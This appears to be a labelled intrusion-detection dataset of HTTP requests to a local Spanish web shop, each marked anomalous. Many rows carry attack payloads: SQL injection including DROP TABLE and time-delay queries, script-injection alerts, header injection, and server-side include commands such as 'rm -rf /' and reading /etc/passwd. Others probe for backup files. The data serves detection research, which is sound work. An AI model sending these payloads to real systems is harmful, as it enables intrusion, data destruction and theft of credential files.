POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=bennet&password=%2496c5sa&nombre=Sid&apellidos=Echegoyen+Pazar%E1n&email=senghor-golling3%4024htranslations.ht&dni=16864786J&direccion=Barriada+De+La+Doctora+15+&ciudad=Roa&cp=03610%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&provincia=Valladolid&ntc=0695001148270797&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/6909030637832563290.jsp,,anomalous
GET,http://localhost:8080/tienda1/imagenes.BAK,,anomalous
GET,http://localhost:8080/tienda1/imagenes.java,,anomalous
GET,http://localhost:8080/msadc/adcjavas.inc,,anomalous
GET,http://localhost:8080/iissamples/ExAir/HowToReachUs.asp,,anomalous
GET,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg/4861362529278789730.bak,,anomalous
PUT,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=65&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=65&B1=A%F1adir+al+carrito%27+DELETE+FROM+USERS,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=65&B1=A%F1adir+al+carrito%27+DELETE+FROM+USERS,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=+&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=+&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Ques%2Bo+Manchego&precio=39&cantidad=65&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Ques%2Bo+Manchego&precio=39&cantidad=65&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precioA=39&cantidad=65&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Jam%F3n+Ib%E9rico&precioA=39&cantidad=65&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/_cti_pvt/writeto.cnf,,anomalous
PUT,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=ada&pwd=desmocadero&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=%4040&login=ada&pwd=desmocadero&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=%4040&login=ada&pwd=desmocadero&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ada&pwd=desmocadero&remember=on&B1A=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=ada&pwd=desmocadero&remember=on&B1A=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=1%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%253F,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%253F,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=1,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/4861362529278789730,,anomalous
GET,http://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide,,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=350&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=350&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=350&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precioA=350&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hobin&password=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&nombre=Abinahil&apellidos=Gorostiza+Jorge&email=bradford.bontempo%40informex.tr&dni=80243620R&direccion=Pl.+Salesas+18+&ciudad=Gombr%E8n&cp=44652&provincia=Valladolid&ntc=7032918992932037&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=hobin&password=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&nombre=Abinahil&apellidos=Gorostiza+Jorge&email=bradford.bontempo%40informex.tr&dni=80243620R&direccion=Pl.+Salesas+18+&ciudad=Gombr%E8n&cp=44652&provincia=Valladolid&ntc=7032918992932037&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hobin&password=%2Fo%2Cbnoxi%2Fo&nombre=Abinahil&apellidos=Gorostiza+Jorge&email=bradford.bontempo%40informex.tr&dni=80243620R&direccion=Pl.+Salesas+18+&ciudad=Gombr%E8n&cp=44652&provincia=Valladolid&ntc=7032918992932037&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=hobin&password=%2Fo%2Cbnoxi%2Fo&nombre=Abinahil&apellidos=Gorostiza+Jorge&email=bradford.bontempo%40informex.tr&dni=80243620R&direccion=Pl.+Salesas+18+&ciudad=Gombr%E8n&cp=44652&provincia=Valladolid&ntc=7032918992932037&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hobin&password=desacordante&nombreA=Abinahil&apellidos=Gorostiza+Jorge&email=bradford.bontempo%40informex.tr&dni=80243620R&direccion=Pl.+Salesas+18+&ciudad=Gombr%E8n&cp=44652&provincia=Valladolid&ntc=7032918992932037&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=hobin&password=desacordante&nombreA=Abinahil&apellidos=Gorostiza+Jorge&email=bradford.bontempo%40informex.tr&dni=80243620R&direccion=Pl.+Salesas+18+&ciudad=Gombr%E8n&cp=44652&provincia=Valladolid&ntc=7032918992932037&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1.inc,,anomalous
GET,http://localhost:8080/flash/java/javabean/FlashJavaBean.html,,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/global/creditos.jsp/.OLD,,anomalous
GET,http://localhost:8080/tienda1.old,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dorise&password=anv5r14&nombre=Adelmo&apellidos=Escoda+Begazo&email=skobline%40promotorareina.no&dni=36354909M&direccion=C%2F+Matasiete%2C+26%2C+2-H&ciudad=%22+AND+%221%22%3D%221&cp=42269&provincia=Palencia&ntc=0173606595958509&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=dorise&password=anv5r14&nombre=Adelmo&apellidos=Escoda+Begazo&email=skobline%40promotorareina.no&dni=36354909M&direccion=C%2F+Matasiete%2C+26%2C+2-H&ciudad=%22+AND+%221%22%3D%221&cp=42269&provincia=Palencia&ntc=0173606595958509&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dorise&password=anv5r14&nombre=Adelmo&apellidos=Escoda+Begazo&email=skobline%40promotorareina.no&dni=36354909M&direccion=Pare+Gallifa%2C+*82%2C+&ciudad=Torre+d%27En+Besora%2C+la&cp=42269&provincia=Palencia&ntc=0173606595958509&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=dorise&password=anv5r14&nombre=Adelmo&apellidos=Escoda+Begazo&email=skobline%40promotorareina.no&dni=36354909M&direccion=Pare+Gallifa%2C+*82%2C+&ciudad=Torre+d%27En+Besora%2C+la&cp=42269&provincia=Palencia&ntc=0173606595958509&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/4861362529278789730,,anomalous
GET,http://localhost:8080/tienda1.java,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&cantidad=94&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Queso+Manchego&precio=39%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&cantidad=94&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Ques%2Bo+Manchego&precio=39&cantidad=94&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Ques%2Bo+Manchego&precio=39&cantidad=94&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precioA=39&cantidad=94&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Queso+Manchego&precioA=39&cantidad=94&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=alvarez&pwd=9ec828%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=alvarez&pwd=9ec828%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&login=alvarez&pwd=9ec828&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&login=alvarez&pwd=9ec828&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%2Clynde&pwd=9ec828&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=%2Clynde&pwd=9ec828&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=alvarez&pwd=9ec828&remember=on&B1A=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=alvarez&pwd=9ec828&remember=on&B1A=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=2bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectasSet-cookie%253A%2BTamper%253D1041264011025374727,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectasSet-cookie%253A%2BTamper%253D1041264011025374727,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27OR%27a%3D%27a&precio=5756&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar%27OR%27a%3D%27a&precio=5756&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=5756&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modoA=insertar&precio=5756&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/.OLD,,anomalous
GET,http://localhost:8080/iisadmpwd/aexp2b.htr,,anomalous
PUT,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=alane&password=9u7Je&nombre=Ignolinda&apellidos=Motta&email=fargue-innis%40soycastellano.no&dni=04469375S&direccion=Calle+Melchor+Cobo+Medina%2C+16%2C+6H&ciudad=Andorra&cp=09129&provincia=Girona&ntc=1134011255413195&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=alane&password=9u7Je&nombre=Ignolinda&apellidos=Motta&email=fargue-innis%40soycastellano.no&dni=04469375S&direccion=Calle+Melchor+Cobo+Medina%2C+16%2C+6H&ciudad=Andorra%27OR%27a%3D%27a&cp=09129&provincia=Girona&ntc=1134011255413195&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=alane&password=9u7Je&nombre=Ignolinda&apellidos=Motta&email=fargue-innis%40soycastellano.no&dni=04469375S&direccion=Calle+Melchor+Cobo+Medina%2C+16%2C+6H&ciudad=Andorra%27OR%27a%3D%27a&cp=09129&provincia=Girona&ntc=1134011255413195&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=alane&password=9u7Je&nombre=Ignolinda&apellidos=Motta&email=fargue-innis%40soycastellano.no&dni=04469375S&direccion=Calle+Melchor+Cobo+Medina%2C+16%2C+6H&ciudad=Andorra&cp=09129&provincia=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&ntc=1134011255413195&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=alane&password=9u7Je&nombre=Ignolinda&apellidos=Motta&email=fargue-innis%40soycastellano.no&dni=04469375S&direccion=Calle+Melchor+Cobo+Medina%2C+16%2C+6H&ciudad=Andorra&cp=09129&provincia=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&ntc=1134011255413195&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=alane&passwordA=9u7Je&nombre=Ignolinda&apellidos=Motta&email=fargue-innis%40soycastellano.no&dni=04469375S&direccion=Calle+Melchor+Cobo+Medina%2C+16%2C+6H&ciudad=Andorra&cp=09129&provincia=Girona&ntc=1134011255413195&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=alane&passwordA=9u7Je&nombre=Ignolinda&apellidos=Motta&email=fargue-innis%40soycastellano.no&dni=04469375S&direccion=Calle+Melchor+Cobo+Medina%2C+16%2C+6H&ciudad=Andorra&cp=09129&provincia=Girona&ntc=1134011255413195&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27+AND+%271%27%3D%271,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%27+AND+%271%27%3D%271,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%22+AND+%221%22%3D%221,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%22+AND+%221%22%3D%221,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080.Old,,anomalous
GET,http://localhost:8080/tienda1/4861362529278789730.OLD,,anomalous
GET,http://localhost:8080.inc,,anomalous
GET,http://localhost:8080/CFIDE/administrator/welcomedoc.cfm,,anomalous
GET,http://localhost:8080/tienda1/global/estilos.css~,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg~,,anomalous
GET,http://localhost:8080/tienda1/miembros/index.jsp/asf-logo-wide.gif.inc,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ning&password=Graciosamente&nombre=Roc%EDo+Libertad&apellidos=Oviol+De+la+Quintana&email=tchoukova%40sgi-sl.is&dni=16822336K&direccion=Urbanizacion+Palmeras%2C+S%2FN%2C+&ciudad=Mo%2Bntgai&cp=17723&provincia=Segovia&ntc=1507392936285379&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=ning&password=Graciosamente&nombre=Roc%EDo+Libertad&apellidos=Oviol+De+la+Quintana&email=tchoukova%40sgi-sl.is&dni=16822336K&direccion=Urbanizacion+Palmeras%2C+S%2FN%2C+&ciudad=Mo%2Bntgai&cp=17723&provincia=Segovia&ntc=1507392936285379&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modoA=registro&login=ning&password=Graciosamente&nombre=Roc%EDo+Libertad&apellidos=Oviol+De+la+Quintana&email=tchoukova%40sgi-sl.is&dni=16822336K&direccion=Urbanizacion+Palmeras%2C+S%2FN%2C+&ciudad=Oropesa&cp=17723&provincia=Segovia&ntc=1507392936285379&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modoA=registro&login=ning&password=Graciosamente&nombre=Roc%EDo+Libertad&apellidos=Oviol+De+la+Quintana&email=tchoukova%40sgi-sl.is&dni=16822336K&direccion=Urbanizacion+Palmeras%2C+S%2FN%2C+&ciudad=Oropesa&cp=17723&provincia=Segovia&ntc=1507392936285379&B1=Registrar,anomalous
GET,http://localhost:8080/mail.box,,anomalous
GET,http://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide.gif.bak,,anomalous
GET,http://localhost:8080/tienda1/imagenes/2.gif/,,anomalous
GET,http://localhost:8080/tienda1/imagenes.old,,anomalous
GET,http://localhost:8080/tienda1/imagenes/3.gif/asf-logo-wide,,anomalous
GET,http://localhost:8080/_vti_log/,,anomalous
GET,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg/asf-logo-wide.gif/.java,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Vino+Rioja&precio=100&cantidad=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precioA=100&cantidad=4&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Vino+Rioja&precioA=100&cantidad=4&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=balwinde&pwd=nac%E1reo&remember=off&B1=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=balwinde&pwd=nac%E1reo&remember=off&B1=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=balwinde&pwd=p%2714pa514%2Fi1%2Fo&remember=off&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=balwinde&pwd=p%2714pa514%2Fi1%2Fo&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=balwinde&pwd=nac%E1reo&remember=off&B1A=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=balwinde&pwd=nac%E1reo&remember=off&B1A=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%253F,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=2%253F,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=2,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/miembros.jsp/6909030637832563290.jsp,,anomalous
GET,http://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide.gif.OLD,,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1633&B1=Confirmar%27INJECTED_PARAM,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=1633&B1=Confirmar%27INJECTED_PARAM,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Confirmar,anomalous
